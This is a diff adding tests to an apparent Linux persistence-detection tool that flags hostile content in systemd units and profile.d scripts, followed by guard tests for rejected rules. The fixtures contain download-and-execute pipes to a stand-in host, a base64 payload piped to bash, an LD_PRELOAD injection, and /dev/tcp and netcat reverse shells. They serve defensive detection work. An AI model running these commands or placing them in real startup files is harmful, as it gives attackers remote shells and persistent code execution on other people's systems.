@@ -757,3 +757,107 @@ def test_startup_script_symlinks_are_skipped(tmp_path):
     (d / "vendor.sh").symlink_to(real)
     res = persistence.run(_Backend(), _ctx(tmp_path))
     assert [f for f in res.findings if f.check == "unowned-startup-script"] == []
+
+
+# ------------------------------- P3: content that does not belong in a startup file
+#
+# Measured 2026-09-01 over 2,104 startup files on six hosts (Manjaro, Arch, Debian 13,
+# Ubuntu 26.04, AlmaLinux 9, Fedora 44). Every shipped rule scored 0. The rejected ones
+# each have a guard below, because a floor is only useful if undoing it breaks something.
+
+
+@pytest.mark.parametrize("body,phrase", [
+    ("[Service]\nEnvironment=LD_PRELOAD=/tmp/.x/evil.so\n", "LD_PRELOAD"),
+    ("[Service]\nExecStart=/bin/sh -c 'curl http://x.example/p | sh'\n", "download"),
+    ("[Service]\nExecStart=/bin/sh -c 'echo Zm9v | base64 -d | bash'\n", "base64"),
+    ("[Service]\nExecStart=/bin/bash -c 'exec 3<>/dev/tcp/10.0.0.1/4444'\n", "redirection"),
+    ("[Service]\nExecStart=/bin/nc -e /bin/sh 10.0.0.1 4444\n", "netcat"),
+])
+def test_each_shipped_content_signal_is_found(tmp_path, body, phrase):
+    _unit(tmp_path, "x.service", body)
+    found = [f for f in persistence.run(_Backend(), _ctx(tmp_path)).findings
+             if f.check == "startup-content-signal"]
+    assert len(found) == 1
+    assert found[0].severity == HIGH
+    assert phrase in found[0].detail
+    assert "The line is:" in found[0].detail, "showing the line is the point"
+
+
+def test_a_content_signal_fires_on_a_package_owned_file(tmp_path):
+    """The case this exists for. The location rule only ever looks at unowned files, so
+    a line added to a unit a package owns is invisible to every ownership check."""
+    path = _unit(tmp_path, "sshd.service",
+                 "[Service]\nExecStart=/usr/bin/sshd\nEnvironment=LD_PRELOAD=/tmp/e.so\n")
+    res = persistence.run(_Backend(owned=[path]), _ctx(tmp_path))
+    assert [f.check for f in res.findings if f.check == "startup-content-signal"] \
+        == ["startup-content-signal"]
+    assert [f for f in res.findings if f.check == "unowned-unit"] == []
+
+
+def test_content_signals_apply_to_startup_scripts_too(tmp_path):
+    d = tmp_path / "etc/profile.d"
+    d.mkdir(parents=True)
+    (d / "hook.sh").write_text("wget -qO- http://x.example/p | bash\n")
+    found = [f for f in persistence.run(_Backend(), _ctx(tmp_path)).findings
+             if f.check == "startup-content-signal"]
+    assert [f.subject for f in found] == ["/etc/profile.d/hook.sh"]
+
+
+def test_a_commented_out_signal_is_not_a_finding(tmp_path):
+    """Half the scripts on a machine document what they do. A check that reads comments
+    as code reports the header of every one of them."""
+    d = tmp_path / "etc/profile.d"
+    d.mkdir(parents=True)
+    (d / "doc.sh").write_text("# install with: curl http://x.example/get | sh\ntrue\n")
+    res = persistence.run(_Backend(), _ctx(tmp_path))
+    assert [f for f in res.findings if f.check == "startup-content-signal"] == []
+
+
+def test_one_finding_per_file_per_signal(tmp_path):
+    _unit(tmp_path, "noisy.service",
+          "[Service]\nEnvironment=LD_PRELOAD=/tmp/a.so\nEnvironment=LD_PRELOAD=/tmp/b.so\n")
+    found = [f for f in persistence.run(_Backend(), _ctx(tmp_path)).findings
+             if f.check == "startup-content-signal"]
+    assert len(found) == 1
+
+
+# --- the rejected rules, each guarded so the measurement cannot be quietly undone ---
+
+
+def test_eval_is_not_a_signal(tmp_path):
+    """12 hits across six hosts, every one a distro-shipped /etc/profile.d script.
+    colorls.sh, lang.sh and which2.sh all use it; six on AlmaLinux, five on Fedora."""
+    d = tmp_path / "etc/profile.d"
+    d.mkdir(parents=True)
+    (d / "colorls.sh").write_text('eval "$(dircolors -b)"\n')
+    res = persistence.run(_Backend(), _ctx(tmp_path))
+    assert [f for f in res.findings if f.check == "startup-content-signal"] == []
+
+
+def test_downloading_without_piping_to_a_shell_is_not_a_signal(tmp_path):
+    """Ubuntu's /etc/update-motd.d/50-motd-news fetches news over HTTP on every login.
+    Downloading is ordinary; executing what came back is not."""
+    d = tmp_path / "etc/update-motd.d"
+    d.mkdir(parents=True)
+    (d / "50-motd-news").write_text("curl -s http://motd.ubuntu.com > /tmp/news\n")
+    res = persistence.run(_Backend(), _ctx(tmp_path))
+    assert [f for f in res.findings if f.check == "startup-content-signal"] == []
+
+
+def test_chmod_x_is_not_a_signal(tmp_path):
+    """One hit across six hosts, in AlmaLinux's own shipped /etc/rc.local, and every
+    installer on earth does it."""
+    (tmp_path / "etc").mkdir(parents=True, exist_ok=True)
+    (tmp_path / "etc/rc.local").write_text("#!/bin/sh\nchmod +x /usr/local/bin/thing\n")
+    res = persistence.run(_Backend(), _ctx(tmp_path))
+    assert [f for f in res.findings if f.check == "startup-content-signal"] == []
+
+
+def test_inline_python_is_not_a_signal(tmp_path):
+    """Scored 0, and still rejected: ExecStartPre=/usr/bin/python3 -c is ordinary, so a
+    zero floor was not on its own a reason to ship it."""
+    _unit(tmp_path, "setup.service",
+          "[Service]\nExecStartPre=/usr/bin/python3 -c 'import os; os.makedirs(\"/x\")'\n"
+          "ExecStart=/usr/bin/true\n")
+    res = persistence.run(_Backend(), _ctx(tmp_path))
+    assert [f for f in res.findings if f.check == "startup-content-signal"] == []
